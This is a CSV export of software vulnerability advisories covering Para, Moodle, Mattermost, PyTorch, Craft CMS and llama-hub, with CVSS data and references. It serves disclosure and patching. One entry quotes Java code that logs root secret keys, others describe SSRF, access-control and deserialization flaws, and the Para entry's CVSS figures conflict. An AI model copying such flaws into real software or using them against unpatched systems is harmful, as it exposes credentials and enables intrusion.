id,summary,description,severity,cvss_score,cvss_vector,affected_packages,published_date,updated_date,references
GHSA-v75g-77vf-6jjq,Para Server Logs Sensitive Information,"CWE ID: CWE-532 (Insertion of Sensitive Information into Log File)
CVSS:  7.5 (High)
Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Affected Component:** Para Server Initialization Logging
**Version:** Para v1.50.6
**File Path:** `para-1.50.6/para-server/src/main/java/com/erudika/para/server/utils/HealthUtils.java`
**Vulnerable Line(s):** Line 132 (via `logger.info(...)` with root credentials)

Technical Details:

The vulnerability is located in the HealthUtils.java file, where a failed configuration file write triggers the following logging statement:
```java
logger.info(""Initialized root app with access key '{}' and secret '{}', but could not write these to {}."",
    rootAppCredentials.get(""accessKey""),
    rootAppCredentials.get(""secretKey""),
    confFile);
```
This exposes both access and secret keys in logs without redaction. These credentials are later reused in variable assignments for persistence but do not require logging for debugging or system health purposes.",medium,6.2,CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N,maven: com.erudika:para-server,2025-05-30T20:01:10Z,2025-05-30T20:01:10Z,https://github.com/Erudika/para/security/advisories/GHSA-v75g-77vf-6jjq; https://github.com/Erudika/para/commit/1e8a89558542854bb0683ab234c4429ad93b0835; https://github.com/advisories/GHSA-v75g-77vf-6jjq
GHSA-vjxx-54vw-q59f,Moodle SSRF Vulnerability,"The `edit_blog.php` script allows a registered user to add external RSS feed resources. It was identified that this feature could be abused to be used as a SSRF attack vector by adding a malicious URL/TCP PORT in order to target internal network or an internet hosted server, bypassing firewall rules, IP filtering and more.

This kind of vulnerability is then called “blind” because of no response available on Moodle web site, enforcing attacker to exploit it using a “time based” approach.",high,7.5,CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H,composer: moodle/moodle,2022-05-14T01:17:52Z,2025-05-30T19:54:42Z,https://nvd.nist.gov/vuln/detail/CVE-2019-6970; https://cds.thalesgroup.com/en/tcs-cert/CVE-2019-6970; https://excellium-services.com/cert-xlm-advisory/cve-2019-6970; https://www.excellium-services.com/cert-xlm-advisory; https://www.excellium-services.com/cert-xlm-advisory/cve-2019-6970; https://github.com/advisories/GHSA-vjxx-54vw-q59f
GHSA-86jg-35xj-3vv5,Mattermost fails to properly enforce access control restrictions for System Manager roles,"Mattermost versions 10.7.x <= 10.7.0, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fails to properly enforce access control restrictions for System Manager roles, allowing authenticated users with System Manager privileges to view team details they should not have access to via direct API requests to team endpoints, even when explicitly configured with 'No access' to Teams in the System Console.",low,3.1,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:34Z,https://nvd.nist.gov/vuln/detail/CVE-2025-3611; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/6f33b721de76b39a7714bfe0d5e9c1306869a3e3; https://github.com/advisories/GHSA-86jg-35xj-3vv5
GHSA-mc2f-jgj6-6cp3,Mattermost fails to properly invalidate personal access tokens upon user deactivation,"Mattermost versions 10.7.x <= 10.7.0, 10.6.x <= 10.6.2, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fails to properly invalidate personal access tokens upon user deactivation, allowing deactivated users to maintain full system access by exploiting access token validation flaws via continued usage of previously issued tokens.",medium,5.4,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:29Z,https://nvd.nist.gov/vuln/detail/CVE-2025-3230; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/65343f84a7830fa8078fe3df879fca924e4fac01; https://github.com/advisories/GHSA-mc2f-jgj6-6cp3
GHSA-8cgx-9ccj-3gwr,Mattermost fails to clear Google OAuth credentials,"Mattermost versions 10.7.x <= 10.7.0, 10.6.x <= 10.6.2, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fail to clear Google OAuth credentials when converting user accounts to bot accounts, allowing attackers to gain unauthorized access to bot accounts via the Google OAuth signup flow.",medium,4.2,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:24Z,https://nvd.nist.gov/vuln/detail/CVE-2025-2571; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/04676582cdd26f4fdfa78fcf60a7f8745e6b27f5; https://github.com/advisories/GHSA-8cgx-9ccj-3gwr
GHSA-hc6v-386m-93pq,Mattermost fails to properly enforce access controls for guest users,"Mattermost versions 10.7.x <= 10.7.0, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fail to properly enforce access controls for guest users accessing channel member information, allowing authenticated guest users to view metadata about members of public channels via the channel members API endpoint.",low,3.1,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:21Z,https://nvd.nist.gov/vuln/detail/CVE-2025-1792; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/c23f44fe8ed02f71d506f99adc30ad34c58c89d1; https://github.com/advisories/GHSA-hc6v-386m-93pq
GHSA-887c-mr87-cxwp,PyTorch Improper Resource Shutdown or Release vulnerability,"A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.",medium,3.3,CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L,pip: torch,2025-04-16T21:30:59Z,2025-05-30T17:13:52Z,https://nvd.nist.gov/vuln/detail/CVE-2025-3730; https://github.com/pytorch/pytorch/issues/150835; https://github.com/pytorch/pytorch/pull/150981; https://vuldb.com/?ctiid.305076; https://vuldb.com/?id.305076; https://vuldb.com/?submit.553645; https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af; https://github.com/timocafe/tewart-pytorch/commit/46fc5d8e360127361211cb237d5f9eef0223e567; https://github.com/advisories/GHSA-887c-mr87-cxwp
GHSA-3749-ghw9-m3mg,PyTorch susceptible to local Denial of Service,"A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.",low,3.3,CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L,pip: torch,2025-03-30T18:30:24Z,2025-05-30T17:13:29Z,https://nvd.nist.gov/vuln/detail/CVE-2025-2953; https://github.com/pytorch/pytorch/issues/149274; https://github.com/pytorch/pytorch/issues/149274#issue-2923122269; https://vuldb.com/?ctiid.302006; https://vuldb.com/?id.302006; https://vuldb.com/?submit.521279; https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models; https://github.com/advisories/GHSA-3749-ghw9-m3mg
GHSA-2p6p-9rc9-62j9,Craft CMS has potential RCE when PHP `register_argc_argv` config setting is enabled,"### Impact
You are affected if your php.ini configuration has `register_argc_argv` enabled.

### Patches
Update to 3.9.14, 4.13.2, or 5.5.2.

### Workarounds
If you can't upgrade yet, and `register_argc_argv` is enabled, you can disable it to mitigate the issue.",critical,,,composer: craftcms/cms; composer: craftcms/cms; composer: craftcms/cms,2024-12-18T19:47:26Z,2025-05-30T16:41:54Z,https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9; https://github.com/craftcms/cms/commit/82e893fb794d30563da296bca31379c0df0079b3; https://nvd.nist.gov/vuln/detail/CVE-2024-56145; https://github.com/Chocapikk/CVE-2024-56145; https://github.com/advisories/GHSA-2p6p-9rc9-62j9
GHSA-297x-2qf3-jrj3,Unsafe yaml deserialization in llama-hub,The OpenAPI and ChatGPT plugin loaders in LlamaHub (aka llama-hub) before 0.0.67 allow attackers to execute arbitrary code because safe_load is not used for YAML.,critical,9.8,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,pip: llama-hub,2024-01-21T18:30:34Z,2025-05-30T16:31:58Z,https://nvd.nist.gov/vuln/detail/CVE-2024-23730; https://github.com/run-llama/llama-hub/blob/v0.0.67/CHANGELOG.md; https://github.com/run-llama/llama-hub/releases/tag/v0.0.67; https://github.com/run-llama/llama-hub/commit/c01416e737c7747a213a79881b8308c41d043515; https://github.com/run-llama/llama-hub/pull/841/commits/9dc9c21a5c6d0226d1d2101c3121d4f085743d52; https://github.com/advisories/GHSA-297x-2qf3-jrj3
